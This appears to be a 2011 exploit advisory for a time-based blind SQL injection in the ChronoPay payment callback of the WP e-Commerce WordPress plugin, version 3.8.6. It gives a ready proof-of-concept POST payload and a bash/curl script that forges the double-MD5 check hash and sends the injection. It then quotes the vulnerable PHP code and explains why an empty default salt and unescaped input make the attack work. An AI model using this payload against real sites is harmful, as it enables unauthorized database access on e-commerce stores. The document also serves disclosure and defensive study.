# Date: 2011-09-13
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 3.8.6 (tested)
# Note: parameter $_POST["cs3"] == md5(md5(urldecode($_POST["cs1"])))
#       it has a "chronopay_salt" option but it&#039;s set to &#039;&#039; by default (see more description down below)
 
---------------
PoC (POST data)
---------------
http://www.site.com/?chronopay_callback=true
 cs2=chronopay&cs1=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)%23&cs3=123f7bcd4ba53fade05886a7e77bf045&transaction_type=rebill
 
e.g.
#!/bin/bash
payload="-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)#"
hash=`echo -n $payload | md5sum | tr -d &#039;\n&#039; | sed &#039;s/\s*-\s*//g&#039; | md5sum | tr -d &#039;\n&#039; | sed &#039;s/\s*-\s*//g&#039;`
curl --data "cs2=chronopay&cs1=$payload&cs3=$hash&transaction_type=rebill" http://www.site.com/?chronopay_callback=true
 
---------------
Vulnerable code
---------------
./wp-e-commerce/wp-shopping-cart.php:
 
    class WP_eCommerce {
 
        function WP_eCommerce() {
            add_action( &#039;plugins_loaded&#039;, array( $this, &#039;init&#039; ), 8 );
        }
 
        function init() {
            ...
            $this->load();
            ...
        }
        function load() {
            ...
            wpsc_core_load_gateways();
            ...
        }
    ...
    $wpec = new WP_eCommerce();
 
 
./wp-e-commerce/wpsc-core/wpsc-functions.php:
 
    function wpsc_core_load_gateways() {
        global $nzshpcrt_gateways, $num, $wpsc_gateways,$gateway_checkout_form_fields;
 
        $gateway_directory      = WPSC_FILE_PATH . &#039;/wpsc-merchants&#039;;
        $nzshpcrt_merchant_list = wpsc_list_dir( $gateway_directory );
 
        $num = 0;
        foreach ( $nzshpcrt_merchant_list as $nzshpcrt_merchant ) {
            if ( stristr( $nzshpcrt_merchant, &#039;.php&#039; ) ) {
                require( WPSC_FILE_PATH . &#039;/wpsc-merchants/&#039; . $nzshpcrt_merchant );
            }
 
 
./wp-e-commerce/wpsc-merchants/chronopay.php:
 
    function nzshpcrt_chronopay_callback()
    {
        ...
        if(isset($_GET[&#039;chronopay_callback&#039;]) && ($_GET[&#039;chronopay_callback&#039;] == &#039;true&#039;) && ($_POST[&#039;cs2&#039;] == &#039;chronopay&#039;))
        {
            $salt = get_option(&#039;chronopay_salt&#039;);
            // - this is by default &#039;&#039; and set only if explicitly stated
            //   inside Store Settings->Payments->General Settings->
            //   Chronopay->Edit->Security Key
            // - problem is that there are more popular payment gateways enlisted (e.g.
            //   Google Checkout and PayPal) and if that setting is not explicitly set
            //   it wide opens the door to the potential attacker
 
            $gen_hash = md5($salt . md5($_POST[&#039;cs1&#039;] . $salt));   
             
            if($gen_hash == $_POST[&#039;cs3&#039;])
            {
                ...
                $sessionid = trim(stripslashes($_POST[&#039;cs1&#039;]));
                $transaction_id = trim(stripslashes($_POST[&#039;transaction_id&#039;]));
                $verification_data[&#039;trans_id&#039;] = trim(stripslashes($_POST[&#039;transaction_id&#039;]));
                $verification_data[&#039;trans_type&#039;] = trim(stripslashes($_POST[&#039;transaction_type&#039;]));
 
                switch($verification_data[&#039;trans_type&#039;])
                {
                    ...
                    case &#039;rebill&#039;:
                        $wpdb->query("UPDATE `".WPSC_TABLE_PURCHASE_LOGS."` SET
                                            `processed` = &#039;2&#039;,
                                            `transactid` = &#039;".$transaction_id."&#039;,
                                            `date` = &#039;".time()."&#039;
                                        WHERE `sessionid` = ".$sessionid." LIMIT 1");
    ...
    add_action(&#039;init&#039;, &#039;nzshpcrt_chronopay_callback&#039;);



